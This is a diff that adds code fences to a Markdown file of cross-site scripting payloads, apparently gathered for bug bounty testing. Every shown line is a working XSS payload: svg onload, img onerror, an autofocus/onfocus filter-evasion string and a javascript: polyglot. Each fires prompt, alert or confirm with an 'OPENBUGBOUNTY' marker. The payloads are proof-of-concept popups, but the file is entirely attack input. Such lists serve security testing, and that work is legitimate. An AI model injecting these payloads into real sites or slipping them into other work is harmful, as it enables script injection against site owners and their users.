@@ -1,5 +1,6 @@
 # XSS Payloads
 
+```
 "><svg/onload=prompt(/OPENBUGBOUNTY/)>
 '"--!><img src=x onerror=alert("OPENBUGBOUNTY")> 
 '"/><svg/onload=prompt(/OPENBUGBOUNTY/)>
@@ -25,3 +26,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 '"><svg onload=confirm`openbugbounty`>
 <!'/*!"/*!/'/*/"/*--!><Input/Autofocus/*/Onfocus=confirm`OPENBUGBOUNTY`//><Svg>/
 '"><svg/onload=alert(/openbugbounty/)>
+```
